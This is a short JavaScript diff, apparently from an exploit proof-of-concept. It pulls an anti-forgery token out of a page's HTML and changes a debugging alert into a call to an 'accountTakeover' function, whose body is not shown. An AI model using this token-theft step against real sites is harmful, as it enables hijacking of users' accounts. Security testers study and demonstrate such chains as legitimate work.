@@ -20,7 +20,7 @@ function extractToken(html)
 {
 	s = html.substring(html.indexOf('"token" value="'));
 	token = s.substring(15,s.indexOf('" />'));
-	alert(token);
+	accountTakeover(token);
 }
 function accountTakeover()
 {
